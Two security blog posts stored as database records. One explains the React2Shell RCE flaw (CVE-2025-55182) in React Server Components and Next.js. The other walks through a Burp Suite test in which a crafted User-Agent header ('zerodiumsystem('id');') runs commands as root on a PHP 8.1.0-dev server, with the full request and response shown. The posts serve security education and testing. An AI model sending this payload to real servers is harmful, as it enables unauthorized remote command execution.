posts.title: React2Shell CVE-2025-55182
posts.content: Technical breakdown of CVE-2025-55182 (React2Shell), a critical remote code execution vulnerability affecting React Server Components and Next.js applications.
posts.summary: Critical RCE vulnerability in React & Next.js, nicknamed React2Shell, CVE-2025-55182.
posts.description:
Explained:

Critical RCE Vulnerability in React & Next.js.

Modern web development just faced its Log4Shell moment. On December 3, 2025, a critical security vulnerability in React Server Components (RSC) was publicly disclosed: CVE-2025-55182, nicknamed React2Shell, enables unauthenticated remote code execution (RCE) against servers running vulnerable React and Next.js applications ‚Äî with a CVSS score of 10.0, the highest possible severity. This bug allows attackers to execute arbitrary commands on servers with nothing more than a single crafted HTTP request ‚Äî no credentials, no special configuration, and no indicators by default. Why This Is So Dangerous React Server Components (introduced in React 19) allow rendering parts of a React application on the server for better performance and smaller client bundles. However, the architecture depends on streaming serialized payloads over the React Flight protocol. A flaw in deserialization logic allows malicious payloads to:
  • Manipulate JavaScript prototypes,
  • Resolve dangerous Node.js modules such as child_process,
  • Trigger functions capable of executing system commands.
The vulnerable path centers around a function called: requireModule(). The Reality: Exploitation Within Hours Within hours of public disclosure, threat intelligence teams observed active exploitation by China-aligned groups including Earth Lamia and Jackpot Panda. Captured attacks included:
  • Credential harvesting via dumping .env files.
  • Host reconnaissance using whoami, uname, id.
  • Persistence attempts by writing files under /tmp/.
Public proof-of-concept exploits were released on GitHub on December 4‚Äì5, achieving 100% success against clean default installs of create-next-app.

posts.title: Exploiting Command Injection via HTTP User-Agent Header Using Burp Suite
posts.content: This article explains the discovery process, payload testing, response analysis, and the security implications of this vulnerability.
posts.summary: Security testing tools like Burp Suite are invaluable for identifying and validating these weaknesses before attackers exploit them
posts.description:
Exploiting Command Injection via HTTP User-Agent Header Using Burp Suite

Introduction

During a web application security test, I discovered a command injection vulnerability triggered through the HTTP User-Agent header. By modifying the header and analyzing the server response, I was able to confirm remote command execution (RCE) on the target system.

This article explains the discovery process, payload testing, response analysis, and the security implications of this vulnerability.

Step-by-step breakdown

1. Intercepting the HTTP Request

Using Burp Suite Proxy, I intercepted a standard GET request sent to the target server.

GET / HTTP/1.1
Host: target:8080
User-Agent: zerodiumsystem('id');
Accept: text/html
Connection: close

The key manipulation here was injecting a command into the User-Agent header. This tests whether the server improperly passes header input into a system-level function.

2. Sending the Request to Repeater

The request was forwarded to Burp Suite Repeater to manually resend and analyze the response.

3. Analyzing the Server Response

HTTP/1.1 200 OK
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8

uid=0(root) gid=0(root) groups=0(root)
hello world

The output of the id command confirms that the server executed the injected system command. The process was running as root, which significantly increases the severity of the vulnerability.

This confirms a successful Remote Command Execution (RCE) vulnerability.

Tools Used

  • Burp Suite (Proxy and Repeater)
  • Manual HTTP header manipulation
  • Basic Linux command (id) for execution validation

Lessons Learned

  • HTTP headers are part of the attack surface.
  • Unsanitized user input can lead to command injection.
  • Applications should never execute shell commands directly from user-controlled data.
  • Services should not run with root privileges.
  • Development builds (e.g., PHP dev versions) should not be exposed in production.

Conclusion

This test demonstrates how seemingly harmless HTTP headers can become critical attack vectors when improperly handled by backend systems. Proper input validation, least-privilege execution, and secure deployment practices are essential to prevent command injection vulnerabilities.

Security testing tools like Burp Suite are invaluable for identifying and validating these weaknesses before attackers exploit them.

.
